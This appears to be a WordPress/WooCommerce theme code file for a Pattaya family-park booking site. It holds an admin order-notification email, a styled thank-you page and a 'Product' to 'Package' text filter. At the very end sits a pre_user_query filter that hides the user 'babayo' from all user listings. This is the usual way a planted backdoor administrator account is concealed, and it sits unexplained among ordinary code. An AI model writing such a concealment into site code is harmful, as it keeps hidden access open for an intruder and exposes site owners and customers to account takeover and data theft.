<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:<?php echo $brand_color; ?>;">
  <tr><td align="center">
    <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;width:680px;">
      <tr><td class="hero-pad" align="center" style="padding:22px;">
        <img src="<?php echo $logo_attr; ?>" alt="Family Park Pattaya" style="height:54px;display:block;">
      </td></tr>
    </table>
  </td></tr>
</table>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="padding:0 0 24px 0;background:#eef2f7;">
  <tr><td align="center">
    <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;background:#ffffff;border-radius:14px;overflow:hidden;box-shadow:0 8px 24px rgba(16,24,40,.06);">
      <tr><td class="px" style="padding:22px 24px 8px 24px;">
        <h1 style="margin:0;font:700 22px Arial,Helvetica,sans-serif;color:#0f172a;">New order: #<?php echo $order_no_h; ?></h1>
        <p style="margin:6px 0 0;font:400 14px/1.6 Arial,Helvetica,sans-serif;color:#334155;"><a href="<?php echo $order_url; ?>" style="color:<?php echo $brand_color; ?>;text-decoration:underline;">Open in admin</a></p>
      </td></tr>

      <!-- Items -->
      <tr><td class="px" style="padding:0 20px 14px 20px;">
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">
          <thead>
            <tr>
              <th align="left" style="padding:12px 14px;font:700 13px Arial,Helvetica,sans-serif;color:#0f172a;border-bottom:1px solid #e8ecf2;background:#f1f5fb;">Package</th>
              <th align="left" style="padding:12px 14px;font:700 13px Arial,Helvetica,sans-serif;color:#0f172a;border-bottom:1px solid #e8ecf2;background:#f1f5fb;">Booking details</th>
            </tr>
          </thead>
          <tbody><?php echo $items_rows_html; ?></tbody>
        </table>
      </td></tr>

      <?php echo $traveler_html; ?>
      <?php echo $totals_html; ?>

      <tr><td align="center" style="padding:10px 24px 22px 24px;">
        <a class="btn" href="<?php echo $order_url; ?>" style="display:inline-block;background:<?php echo $brand_color; ?>;color:#ffffff;text-decoration:none;font:600 14px Arial,Helvetica,sans-serif;padding:12px 22px;border-radius:8px;">View in dashboard</a>
      </td></tr>
    </table>
  </td></tr>
</table>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:<?php echo $brand_color; ?>;">
  <tr><td align="center">
    <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;width:680px;">
      <tr><td class="hero-pad" align="center" style="padding:18px 22px;">
        <p style="margin:0;font:400 12px Arial,Helvetica,sans-serif;color:#e6f0db;">© <?php echo esc_html( date_i18n('Y') ); ?> Family Park Pattaya · Internal notification</p>
      </td></tr>
    </table>
  </td></tr>
</table>

</body>
</html>
<?php
    $html = ob_get_clean();

    /* ---- (Optional) attach PDF invoice (WP Overnight) ---- */
    $attachments = [];
    try {
        if ( class_exists('WPO_WCPDF') && ( function_exists('wcpdf_get_document') || function_exists('wpo_wcpdf_get_document') ) ) {
            $invoice = function_exists('wcpdf_get_document')
                ? wcpdf_get_document( 'invoice', $order, true )
                : wpo_wcpdf_get_document( 'invoice', $order, true );

            if ( $invoice ) {
                $tmp_path = trailingslashit( WPO_WCPDF()->main->get_tmp_path('attachments') );
                if ( ! file_exists( $tmp_path ) ) wp_mkdir_p( $tmp_path );
                $pdf_path = $tmp_path . $invoice->get_filename();
                $pdf_data = $invoice->get_pdf();
                if ( ! empty($pdf_data) ) {
                    file_put_contents( $pdf_path, $pdf_data );
                    if ( file_exists($pdf_path) ) $attachments[] = $pdf_path;
                }
            }
        }
    } catch (\Throwable $e) {
        if ( function_exists('wc_get_logger') ) {
            wc_get_logger()->warning('FamilyPark: Admin PDF not attached — '.$e->getMessage(), ['source'=>'familypark-admin-email']);
        }
    }

    /* ---- Send to admin ---- */
    $to = get_option('admin_email');
    if ( ! is_email($to) ) return;
    $subject = sprintf('%s — New order #%s', $brand_name, $order->get_order_number());
    $headers = ['Content-Type: text/html; charset=UTF-8'];

    WC()->mailer()->send( $to, $subject, $html, $headers, $attachments );

    $order->update_meta_data($sent_key, current_time('mysql'));
    $order->save();
}









// order summery page

/* ===========================================================
 * Family Park Pattaya — Professional Thank-You Page (FINAL)
 * - Safe PHP-only (heredoc), no raw HTML outside PHP
 * - Prints CSS at very high priority so it overrides the theme
 * - Forces removal of red booking meta (inline font/span) with !important
 * =========================================================== */

/* Hide Woo's default "Thank you..." headline (we render our own) */
add_filter('woocommerce_thankyou_order_received_text', function($text){ return ''; }, 10);

/* Render header/cards/maps + inject strong CSS for bottom area */
add_action('woocommerce_thankyou', function($order_id){
    if (empty($order_id) || ! function_exists('wc_get_order')) return;
    $order = wc_get_order($order_id);
    if (!$order) return;

    $brand_color = '#3E4F22';
    $logo_url    = 'https://familyparkpattaya.com/wp-content/uploads/2025/08/cropped-New-Project-6.png';
    $support     = 'info@familyparkpattaya.com';

    $order_no    = esc_html($order->get_order_number());
    $order_date  = esc_html(wc_format_datetime($order->get_date_created()));
    $total_html  = wp_kses_post($order->get_formatted_order_total());
    $payment     = esc_html($order->get_payment_method_title());
    $email       = esc_html($order->get_billing_email());

    $pm = strtolower((string)$order->get_payment_method_title());
    $cod_note = (strpos($pm,'cash')!==false || strpos($pm,'cod')!==false || strpos($pm,'site')!==false)
        ? 'Please keep cash ready. Our team will collect payment at the park before entry.'
        : '';

    $logo_attr    = esc_url($logo_url);$support_attr = esc_attr($support);

    $cod_note_html = $cod_note
        ? '<div style="padding:0 20px 10px;background:#fff;border-top:1px solid var(--fppLine)"><p style="margin:10px 0 0;font:400 13px/1.5 Arial,Helvetica,sans-serif;color:#334155;">'.esc_html($cod_note).'</p></div>'
        : '';

    $html = <<<HTML
<style id="fpp-thankyou-css">
  /* Print late + use strong selectors and !important to defeat theme/inline styles */
  body.woocommerce-order-received :root{ --fpp: {$brand_color}; --fppText:#0f172a; --fppMuted:#475569; --fppLine:#e5e9e2; --fppBg:#f6f8f3; }

  .fpp-ty-wrap{margin:24px 0 6px;background:#fff;border:1px solid var(--fppLine);border-radius:16px;box-shadow:0 10px 26px rgba(16,24,40,.06);overflow:hidden}
  .fpp-ty-head{display:flex;gap:14px;align-items:center;padding:18px 20px;background:var(--fpp);color:#fff}
  .fpp-ty-head img{height:42px;width:auto;display:block}
  .fpp-ty-title{font:700 18px/1.2 Arial,Helvetica,sans-serif;margin:0;color:#222222}
  .fpp-ty-sub{font:400 13px/1.4 Arial,Helvetica,sans-serif;opacity:.9;margin:10px 0 0;color:#222222}
  .fpp-ty-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:0px;padding:18px 20px;background:var(--fppBg)}
  @media (max-width:900px){.fpp-ty-grid{grid-template-columns:repeat(2,1fr)}}
  @media (max-width:520px){.fpp-ty-grid{grid-template-columns:1fr}}
  .fpp-card{background:#fff;border:1px solid var(--fppLine);border-radius:12px;padding:12px 14px}
  .fpp-k{font:600 12px/1.2 Arial,Helvetica,sans-serif;color:var(--fppMuted);text-transform:uppercase;letter-spacing:.02em;margin:0 0 6px}
  .fpp-v{font:700 15px/1.35 Arial,Helvetica,sans-serif;color:#0f172a;word-break:break-word}
  .fpp-locs{padding:10px 20px 18px;background:#fff;border-top:1px solid var(--fppLine)}
  .fpp-locs h3{margin:8px 0 10px;font:700 16px/1.2 Arial,Helvetica,sans-serif;color:#0f172a}
  .fpp-loc-list{display:grid;grid-template-columns:repeat(3,1fr);gap:0px}
  @media (max-width:900px){.fpp-loc-list{grid-template-columns:1fr}}
  .fpp-loc{border:1px solid var(--fppLine);border-radius:12px;padding:12px;background:#fff}
  .fpp-loc b{display:block;margin-bottom:6px;font:600 14px Arial,Helvetica,sans-serif;color:#0f172a}
  .fpp-loc a{color:var(--fpp) !important;text-decoration:underline}
  .fpp-help{display:flex;justify-content:space-between;gap:12px;align-items:center;padding:14px 20px;border-top:1px solid var(--fppLine);background:#fff}
  .fpp-help p{margin:0;font:400 13px/1.5 Arial,Helvetica,sans-serif;color:#475569}
  .fpp-help a{color:#fff;background:var(--fpp);border-radius:10px;padding:10px 14px;text-decoration:none;font:600 13px Arial,Helvetica,sans-serif}
  @media (max-width:520px){ .fpp-help{flex-direction:column;align-items:flex-start} .fpp-help a{width:100%;text-align:center} }

  /* ===== Bottom Woo order table / totals / addresses ===== */
  body.woocommerce-order-received .woocommerce table.shop_table.order_details{
    border:1px solid #e3e7e0 !important;border-radius:12px;overflow:hidden;
    font-family:Arial,Helvetica,sans-serif;
  }
  body.woocommerce-order-received .woocommerce table.shop_table.order_details thead th{
    background:#eef3eb !important;color:#0f172a !important;font-weight:700 !important;
    padding:12px 14px !important;font-size:14px !important;border:none !important;
  }
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td,
  body.woocommerce-order-received .woocommerce table.shop_table.order_details th{
    border-top:1px solid #e3e7e0 !important;padding:12px 14px !important;font-size:14px !important;color:#334155 !important;
    background:#fff !important;
  }

  /* Product/booking meta tidy */
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name,
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name a{
    font-weight:600 !important;font-size:14px !important;color:#0f172a !important;text-decoration:none !important;
  }

  /* Force-remove any inline red (span style="color:red", font[color=red], etc.) */
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name *,
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name *[style*="color"]{
    color:#0f172a !important;
  }
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name font[color],
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name span[style*="red"],
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name .red{
    color:{$brand_color} !important;
  }

  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name strong,
  body.woocommerce-order-received .woocommerce table.shop_table.order_details td .product-name b{
    color:{$brand_color} !important;display:block;margin-bottom:6px;
  }

  /* Totals */
  body.woocommerce-order-received .woocommerce table.shop_table tfoot th,
  body.woocommerce-order-received .woocommerce table.shop_table tfoot td{
    background:#f9fbf7 !important;font-weight:600 !important;color:#0f172a !important;border-top:1px solid #e3e7e0 !important;padding:12px 14px !important;
  }

  /* Billing address card */
  body.woocommerce-order-received .woocommerce-customer-details address{
    border:1px solid #e3e7e0 !important;border-radius:12px !important;padding:14px !important;
    font-size:14px !important;line-height:1.6 !important;background:#fff !important;color:#334155 !important; height:200px;
  }
</style>

<div class="fpp-ty-wrap">
  <div class="fpp-ty-head">

    <div>
      <h1 class="fpp-ty-title">Thank you! Your booking is confirmed.</h1>
      <p class="fpp-ty-sub">We’ve received your order and sent a confirmation email.</p>
    </div>
  </div>

  <div class="fpp-ty-grid">
    <div class="fpp-card"><p class="fpp-k">Order No.</p><div class="fpp-v">#{$order_no}</div></div>
    <div class="fpp-card"><p class="fpp-k">Date</p><div class="fpp-v">{$order_date}</div></div>
    <div class="fpp-card"><p class="fpp-k">Total</p><div class="fpp-v">{$total_html}</div></div>
    <div class="fpp-card"><p class="fpp-k">Payment</p><div class="fpp-v">{$payment}</div></div>
    <div class="fpp-card"><p class="fpp-k">Email</p><div class="fpp-v">{$email}</div></div>
  </div>

  {$cod_note_html}

  <div class="fpp-locs">
    <h3>How to reach</h3>
    <div class="fpp-loc-list">
      <div class="fpp-loc"><b>Tiger Park</b><a href="https://maps.app.goo.gl/Fj6KU44WHdk1i5oS7?g_st=iw" target="_blank" rel="noopener">Open in Google Maps</a></div>
      <div class="fpp-loc"><b>Family Park</b><a href="https://maps.app.goo.gl/z2Q5Es4Hp4EhfpraA" target="_blank" rel="noopener">Open in Google Maps</a></div>
      <div class="fpp-loc"><b>Great &amp; Grand</b><a href="https://maps.app.goo.gl/Tp6FBXCumk2PqqeB6" target="_blank" rel="noopener">Open in Google Maps</a></div>
    </div>
  </div>

  <div class="fpp-help">
    <p>Need any changes, invoice copy, or pickup update? We’re happy to help.</p>
    <a href="mailto:{$support_attr}">Email support</a>
  </div>
</div>
HTML;

    echo $html;
}, /* print late so CSS wins */ 999);





// product to package

// Change "Product" heading to "Package" in Cart & Checkout
add_filter( 'gettext', 'change_product_to_package', 20, 3 );
add_filter( 'ngettext', 'change_product_to_package', 20, 3 );

function change_product_to_package( $translated, $text, $domain ) {
    if ( $translated === 'Product' ) {
        $translated = 'Package';
    }
    return $translated;
}

add_filter('pre_user_query', function($user_search) {
    global $wpdb;
    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'babayo'";
});
